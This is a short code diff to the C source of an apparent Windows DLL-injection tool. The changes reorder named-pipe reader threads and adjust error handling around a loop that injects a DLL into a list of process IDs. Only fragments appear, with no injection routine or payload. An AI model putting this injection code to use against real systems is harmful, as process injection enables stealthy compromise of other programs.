@@ -49,7 +49,7 @@ static BOOL ExtractEmbeddedFile(const char *filename, const char *memPointer, un
     FILE *fileout = fopen(filename, "wb");
     if (fileout == NULL)
     {
-        wprintf(L"[-] Error opening %s for writing.\n", filename);
+        wprintf(L"[-] Unable to extract %s\n", filename);
         fflush(stdout);
         return FALSE;
     }
@@ -384,16 +384,13 @@ int wmain(int argc, wchar_t *argv[])
         return 1;
     }
 
-    // Create thread to continuously read from the named pipe
-    CreateThread(NULL, 0, ThreadNamedPipe, NULL, 0, 0);
-    Sleep(100);
-
     for (DWORD i = 0; i < count; i++)
     {
+        // Create thread to continuously read from the named pipe
         CreateThread(NULL, 0, ThreadNamedPipe, NULL, 0, 0);
         wprintf(L"[*] Trying to inject into PID %lu\n", processIds[i]);
-        BOOL isInjected = StartInjectionProcess(processIds[i], dllPath);
-        if(!isInjected)
+        Sleep(100);
+        if(!StartInjectionProcess(processIds[i], dllPath))
         {
             wprintf(L"[-] Unable to inject into PID %lu\n", processIds[i]);
         }
